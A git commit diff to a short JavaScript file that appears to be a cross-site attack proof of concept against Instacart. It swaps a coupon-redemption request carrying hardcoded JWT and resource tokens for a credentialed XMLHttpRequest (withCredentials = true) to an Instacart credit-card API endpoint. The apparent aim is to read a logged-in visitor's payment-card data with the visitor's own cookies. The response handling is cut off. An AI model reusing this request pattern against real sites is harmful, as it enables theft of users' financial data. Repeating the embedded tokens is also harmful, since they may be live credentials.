f8dc648e728d7663643dfc9772a49fb6524dadb6
Green <green.epita2016@gmail.com>
2020-08-31 10:26:13 +0200

    go

--- index.js
+++ index.js
@@ -6,6 +6,5 @@ xhr.onreadystatechange = function() {
 	}
 }
 xhr.withCredentials = true;
-params="coupon_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWRlZW1fY291cG9uIiwiY291cG9uX2NvZGUiOiJhY3RpdmF0ZS11cy0wLWRlbGl2ZXJ5IiwiZXhwaXJlc19hdCI6IjIwMjAtMDgtMjlUMDY6NTk6NTkuOTk5WiJ9.Y8Jl9V3yvY4rdUg0wgUHviq0v_nZrbK17tBPJsQ0TGY&notify=true&resource_token=0n9303nVBJUIPXVrmL5ZBPY5_v1rjrD6rpcGNEfohOT-yiIte5KskWMCgXZvRu3Ctal2KLWWYHLauRrx_oC-5ToyODBkNTA3ZjFkNzY0Zjk5M2U1NWI5NzY3ZDEzMDYyMg==&$3p=e_ab&$original_url=https://www.instacart.com/redeem_coupon_token?coupon_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJyZWRlZW1fY291cG9uIiwiY291cG9uX2NvZGUiOiJhY3RpdmF0ZS11cy0wLWRlbGl2ZXJ5IiwiZXhwaXJlc19hdCI6IjIwMjAtMDgtMjlUMDY6NTk6NTkuOTk5WiJ9.Y8Jl9V3yvY4rdUg0wgUHviq0v_nZrbK17tBPJsQ0TGY&notify=true&resource_token=0n9303nVBJUIPXVrmL5ZBPY5_v1rjrD6rpcGNEfohOT-yiIte5KskWMCgXZvRu3Ctal2KLWWYHLauRrx_oC-5ToyODBkNTA3ZjFkNzY0Zjk5M2U1NWI5NzY3ZDEzMDYyMg%3D%3D&_branch_match_id=827595029632477516&utm_medium=Email Braze";
-xhr.open('GET', 'https://www.instacart.com/redeem_coupon_token'+"?"+params, true);
+xhr.open('GET', 'https://www.instacart.com/api/v2/credit_cards?source=web', true);
 xhr.send(null)
